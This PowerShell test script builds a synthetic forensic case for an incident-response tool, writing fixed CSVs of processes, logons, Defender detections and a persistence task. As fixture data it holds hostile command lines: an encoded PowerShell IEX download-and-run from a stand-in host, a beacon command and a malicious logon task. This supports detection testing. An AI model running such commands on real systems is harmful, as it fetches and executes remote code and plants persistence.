# v5.0 Track 5 - synthetic E2E fixture case (CI-runnable end-to-end gate).
# Builds a complete deterministic mini-case (xray.exe story) with known CSV content:
#   - Defender 1116 detection + active threat catalog row for C:\Device\HarddiskVolume3\Users\jsmith\xray.exe
#   - amcache entry + LIVE process (user-writable path, unsigned)
#   - public connection from xray.exe to 203.0.113.66 with a DNS-cache A record
#   - PowerShell 4104 IEX download-string + 4688 encoded command
#   - 4625 brute-force cluster from one IP + one type-3 logon
#   - non-Microsoft scheduled task running the payload from a user-writable path
# Missing artifact families are simply absent (coverage reports them honestly).
#   usage:  powershell -File tests\make_fixture_case.ps1 -Dest <dir>   (creates <dir>)
param([Parameter(Mandatory = $true)][string]$Dest, [string]$RepoRoot = '')
$ErrorActionPreference = 'Stop'
if (-not $RepoRoot) { $RepoRoot = Split-Path -Parent $PSScriptRoot }
if (Test-Path -LiteralPath $Dest) { Remove-Item -LiteralPath $Dest -Recurse -Force }
$csv = Join-Path $Dest 'csv'
foreach ($d in @('volatile', 'logs', 'artifacts', 'persistence', 'defender', 'memory')) {
    New-Item -ItemType Directory -Path (Join-Path $csv $d) -Force | Out-Null
}
function Write-Csv([string]$Sub, [string]$Name, [object[]]$Rows) {
    $p = if ($Sub) { Join-Path (Join-Path $csv $Sub) "$Name.csv" } else { Join-Path $csv "$Name.csv" }
    $Rows | Export-Csv -LiteralPath $p -NoTypeInformation -Encoding UTF8
}
$T0 = [datetime]::new(2026, 11, 15, 9, 14, 0)      # fixed clock -> deterministic windows
function Stamp([int]$MinOff, [int]$SecOff = 0) { $T0.AddMinutes($MinOff).AddSeconds($SecOff).ToString('yyyy-MM-dd HH:mm:ss') }

# ---- case.json (Parse/Analyze adopt identity + admin/sysmon truth from here) ----
@'
{
  "CaseID": "FIXTURE-XRAY-20261115",
  "Host": "FIXTURE-BOX",
  "Computer": "FIXTURE-BOX",
  "CreatedUTC": "2026-11-15T10:30:00.0000000Z",
  "CollectedUTC": "2026-11-15T10:30:00.0000000Z",
  "Role": "Workstation",
  "Preset": "Standard",
  "AdminElevated": true,
  "SysmonPresent": false,
  "OphiraVersion": "5.0",
  "LogHours": 0
}
'@ | Out-File -LiteralPath (Join-Path $Dest 'case.json') -Encoding utf8

# ---- volatile: live process + connections + DNS cache ----
Write-Csv 'volatile' 'processes' @(
    [pscustomobject]@{ PID = 4444; Name = 'xray.exe'; Path = 'C:\Device\HarddiskVolume3\Users\jsmith\xray.exe'; Company = ''; Description = '' }
    [pscustomobject]@{ PID = 940; Name = 'explorer.exe'; Path = 'C:\Device\HarddiskVolume3\Windows\explorer.exe'; Company = 'Microsoft Corporation'; Description = 'Windows Explorer' }
    [pscustomobject]@{ PID = 776; Name = 'svchost.exe'; Path = 'C:\Windows\System32\svchost.exe'; Company = 'Microsoft Corporation'; Description = 'Host Process for Windows Services' }
)
Write-Csv 'volatile' 'flash_public_connections' @(
    [pscustomobject]@{ Process = 'xray.exe'; PID = 4444; RemoteAddress = '203.0.113.66'; RemotePort = 443; State = 'Established'; Proto = 'TCP'; ProcessPath = 'C:\Device\HarddiskVolume3\Users\jsmith\xray.exe'; LocalPort = 51044 }
    [pscustomobject]@{ Process = 'svchost.exe'; PID = 776; RemoteAddress = '20.42.65.92'; RemotePort = 443; State = 'Established'; Proto = 'TCP'; ProcessPath = ''; LocalPort = 51100 }
)
Write-Csv 'volatile' 'dns_cache' @(
    [pscustomobject]@{ Entry = 'cdn.stage.evil-cdn.net'; Data = '203.0.113.66'; Type = 1; TTL = 299 }
    [pscustomobject]@{ Entry = 'settings-win.data.microsoft.com'; Data = '20.42.65.92'; Type = 1; TTL = 60 }
)

# ---- artifacts: amcache + mft ----
Write-Csv 'artifacts' 'amcache' @(
    [pscustomobject]@{ FullPath = '\Device\HarddiskVolume3\Users\jsmith\xray.exe'; Name = 'xray.exe'; SHA1 = 'a6817caf00000000000000000000000000000aa1'; FileKeyLastWriteTimestamp = '2026-11-15 09:10:00' }
    [pscustomobject]@{ FullPath = '\Device\HarddiskVolume3\Windows\svchosts.exe'; Name = 'svchosts.exe'; SHA1 = 'b66379130000000000000000000000000000bb2'; FileKeyLastWriteTimestamp = '2026-11-14 03:22:11' }
    [pscustomobject]@{ FullPath = '\Device\HarddiskVolume3\Windows\explorer.exe'; Name = 'explorer.exe'; SHA1 = ''; FileKeyLastWriteTimestamp = '2025-06-01 00:00:00' }
)
Write-Csv 'artifacts' 'mft_recent' @(
    [pscustomobject]@{ Drive = 'C:'; Path = '\Users\jsmith\'; Name = 'xray.exe'; Created = '2026-11-15 09:13:52'; CreatedFN = '2026-11-15 09:13:52'; LastModified = '2026-11-15 09:13:52'; Size = 284160; Flags = '' }
    [pscustomobject]@{ Drive = 'C:'; Path = '\Windows\'; Name = 'svchosts.exe'; Created = '2026-11-14 03:21:58'; CreatedFN = '2026-11-14 03:21:58'; LastModified = '2026-11-14 03:22:11'; Size = 156672; Flags = '' }
)

# ---- logs: auth (brute force + lateral), proc (4688 enc), powershell (4104 IEX), security ----
$auth = @()
foreach ($i in 1..6) {
    $auth += [pscustomobject]@{ Time = (Stamp -300 $i).ToString(); EventId = 4625; Account = 'jsmith'; AccountDomain = 'FIXTURE-BOX'; SubjectAccount = '-'; SourceIp = '10.10.5.20'; LogonType = 10; LogonId = '' }
}
$auth += [pscustomobject]@{ Time = (Stamp -240).ToString(); EventId = 4624; Account = 'jsmith'; AccountDomain = 'FIXTURE-BOX'; SubjectAccount = 'SYSTEM'; SourceIp = '10.10.5.20'; LogonType = 10; LogonId = '0x3E9F1' }
$auth += [pscustomobject]@{ Time = (Stamp -30).ToString(); EventId = 4624; Account = 'SYSTEM'; AccountDomain = 'NT AUTHORITY'; SubjectAccount = 'SYSTEM'; SourceIp = '127.0.0.1'; LogonType = 5; LogonId = '0x3E7' }
Write-Csv 'logs' 'security_auth_events' $auth
Write-Csv 'logs' 'security_proc_events' @(
    [pscustomobject]@{ Time = (Stamp -20).ToString(); EventId = 4688; Account = 'FIXTURE-BOX\jsmith'; LogonId = '0x3E9F1'; NewProcess = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; CommandLine = 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA2ADYALwBwAHMALwB4AC4AcABzADEAJwApAA=='; ParentProcess = 'C:\Device\HarddiskVolume3\Windows\explorer.exe'; NewProcessId = '0x1B4C'; CreatorPid = 940 }
    [pscustomobject]@{ Time = (Stamp -18).ToString(); EventId = 4688; Account = 'FIXTURE-BOX\jsmith'; LogonId = '0x3E9F1'; NewProcess = 'C:\Device\HarddiskVolume3\Users\jsmith\xray.exe'; CommandLine = '"C:\Device\HarddiskVolume3\Users\jsmith\xray.exe" --beacon 203.0.113.66:443'; ParentProcess = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; NewProcessId = '0x115C'; CreatorPid = 7004 }
)
Write-Csv 'logs' 'powershell_events' @(
    [pscustomobject]@{ TimeCreated = (Stamp -20).ToString(); Id = 4104; Provider = 'Microsoft-Windows-PowerShell'; Level = 'Verbose'; Message = 'Creating Scriptblock text (1 of 1): iex (New-Object Net.WebClient).DownloadString(''http://203.0.113.66/ps/x.ps1'')' }
)
Write-Csv 'logs' 'security_events' @(
    [pscustomobject]@{ TimeCreated = (Stamp -30).ToString(); Id = 4672; Provider = 'Microsoft-Windows-Security-Auditing'; Level = 'Information'; Message = 'Special Logon granted to FIXTURE-BOX\jsmith' }
)

# ---- persistence: one clearly evil task ----
Write-Csv 'persistence' 'scheduled_tasks' @(
    [pscustomobject]@{ Name = 'SysUpdateCheck'; Path = '\Users\jsmith\SysUpdateCheck'; Author = ''; State = 'Ready'; Actions = '"C:\Device\HarddiskVolume3\Users\jsmith\xray.exe" --persist'; Triggers = 'At log on'; RunAs = 'jsmith'; Flags = 'SUSPICIOUS-INTERPRETER;USER-WRITABLE-PATH' }
    [pscustomobject]@{ Name = 'OneDriveStub'; Path = '\Microsoft\OneDrive'; Author = 'Microsoft Corporation'; State = 'Ready'; Actions = '"C:\Program Files (x86)\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"'; Triggers = 'Daily'; RunAs = ''; Flags = '' }
)

# ---- defender: live catalog row + 1116 history in the operational evtx dialect ----
Write-Csv 'defender' 'defender_threats' @(
    [pscustomobject]@{ ThreatName = 'Trojan:Win32/Xray.D!MTB'; Severity = 'High'; ResourcePath = 'file:_C:\Device\HarddiskVolume3\Users\jsmith\xray.exe'; DetectedUTC = (Stamp -15).ToString(); Source = 'live-catalog' }
)
Write-Csv 'defender' 'defender_events' @(
    [pscustomobject]@{ Time = (Stamp -15).ToString(); EventId = 1116; Detail = 'Microsoft Defender Antivirus has detected malware or other potentially unwanted software. Name: Trojan:Win32/Xray.D!MTB ID: 281653 Severity: High Category: Trojan Path: file:_C:\Device\HarddiskVolume3\Users\jsmith\xray.exe Detection Source: Real-Time Protection' }
    [pscustomobject]@{ Time = (Stamp -14).ToString(); EventId = 1117; Detail = 'Microsoft Defender Antivirus has taken action to protect this machine from malicious software. Name: Trojan:Win32/Xray.D!MTB ID: 281653 Severity: High Status: Quarantined' }
)

Write-Host "Fixture case written -> $Dest (xray.exe story, fixed clock $($T0.ToString('yyyy-MM-dd HH:mm')))"
exit 0
